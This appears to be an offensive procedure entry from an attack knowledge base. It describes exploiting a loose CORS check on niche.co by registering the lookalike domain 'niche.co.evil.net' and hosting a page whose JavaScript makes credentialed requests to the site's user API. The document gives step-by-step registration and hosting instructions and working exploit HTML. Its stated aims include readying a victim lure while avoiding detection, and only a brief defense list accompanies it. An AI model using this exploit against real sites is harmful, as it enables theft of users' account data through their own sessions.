---
tags:
  - cors
  - hosting
  - malicious-domain
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[Drive-by Compromise]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 67d6e746-14d7-4703-a4ba-0970dbbd4a9e
created_at: '2025-12-14T17:33:12.339Z'
updated_at: '2025-12-14T17:33:12.339Z'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Host-Malicious-Webpage-on-Spoofed-Domain-for-CORS-Bypass

## Summary

This procedure involves registering and hosting a malicious webpage on a domain crafted to bypass the target site's CORS policy by embedding the target's domain string, enabling subsequent cross-origin attacks with credentials.

## Description

In the context of the niche.co CORS misconfiguration, the server allows Origins containing '//niche.co', so a domain like 'niche.co.evil.net' will be echoed back, permitting credentialed requests. The webpage includes JavaScript using XMLHttpRequest to target API endpoints. Prerequisites include domain registration and a web server; no victim interaction is needed yet. Expected outcome is a live malicious site ready for distribution.

## Requirements

1. Access to a domain registrar to create a subdomain like 'niche.co.evil.net'
2. Web hosting service (e.g., VPS or shared hosting) to serve HTTPS
3. Basic JavaScript knowledge to embed the exploit code

## Defense

Defensive measures and detection strategies:

- Implement strict CORS policies with exact origin whitelisting
- Monitor for anomalous domain registrations containing target strings
- Use Content Security Policy (CSP) to restrict script execution

## Objectives

1. Establish a spoofed origin that passes the target's loose CORS validation
2. Host executable JavaScript for cross-origin requests
3. Prepare for victim lure without alerting defenses

## Instructions

### Step 1: Register Spoofed Domain

**Context**: Create a domain that tricks the Origin header validation.

No command needed; use a registrar like Namecheap or GoDaddy to register 'niche.co.evil.net' and point DNS to your server IP.

> Ensure HTTPS is enabled to mimic legitimate sites and avoid browser warnings.

### Step 2: Develop and Host Malicious HTML

**Context**: Create the webpage with JavaScript for the CORS exploit.

Embed the following HTML/JS on your server:

```html
<!DOCTYPE html>
<html>
<body>
<button onclick="cors()">Click to Exploit</button>
<script>
function cors() {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://www.niche.co/api/v1/users/*****', true);
  xhr.withCredentials = true;
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      // Handle response
      alert('Data fetched: ' + xhr.responseText);
    }
  };
  xhr.send();
}
</script>
</body>
</html>
```

> Upload to your web root (e.g., /var/www/html/malicious.html) and verify accessibility.

### Step 3: Verify Hosting

**Context**: Confirm the page loads and JavaScript is functional.

Access https://niche.co.evil.net/malicious.html in a browser and check console for errors.

> Expected: Page loads without mixed content warnings; button present.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- [[cors]]
- [[hosting]]
- [[malicious-domain]]
